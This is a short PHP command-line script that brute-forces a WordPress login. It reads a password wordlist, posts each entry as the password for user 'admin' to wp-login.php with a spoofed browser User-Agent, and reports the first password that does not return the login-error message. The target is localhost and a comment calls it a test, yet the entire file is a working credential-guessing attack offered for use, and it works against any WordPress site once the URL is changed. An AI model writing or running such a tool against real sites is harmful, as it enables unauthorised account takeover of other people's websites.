<?php
    /**
     * Reading wordlist
     * 
     * @return string   $contents
     */
    function read_wordlist(){
        $filename       = readline('Type wordlist file location: ');
        if (file_exists($filename)){
            $name       = basename($filename);
            print       "\033[33m[~] Loading {$name} wordlist...\033[0m\n";
            $file       = fopen($filename, 'r');
            $contents   = fread($file, filesize($filename));
            print       "\033[32m[+] {$name} loaded successfuly!\033[0m\n";
            return $contents;
        } else {
            print       "\033[31m[-][!] 404 File Not Found!\033[0m\\n";
            exit;
        }
    }
    /**
     * Starting brute force *TEST*
     * 
     * @return void
     */
    function brute(string $wordlist){
        $wlist      = explode("\n", $wordlist);
        $start_time = time();
        $i          = 0;
        $passwords  = count($wlist);
        foreach ($wlist as $password){
            $i++;
            $curl = curl_init('http://localhost/wordpress/wp-login.php');
                    curl_setopt_array($curl, [
                        CURLOPT_POST => true,
                        CURLOPT_POSTFIELDS => ['log' => 'admin','pwd' => $password],
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_HTTPHEADER => ['User-Agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19']
                    ]);
            $result = curl_exec($curl);
            if (strpos($result, '<div id="login_error">')) {
                print           "\033[35m[-] testing {$i}/{$passwords} password \033[0m\"{$password}\"\033[35m is incorrect \033[0m\n";
            } else {
                $finish_time    = time() - $start_time;
                $minutes        = round($finish_time / 60);
                $seconds        = round($finish_time % 60);
                print           "\033[32m[+] Your password is \033[0m\"{$password}\"\n";
                print           "\033[32m[+] Finished in {$minutes}min. and {$seconds}sec.\033[0m\n";
                break;
            }
        }
    }

    $w = read_wordlist();
    brute($w);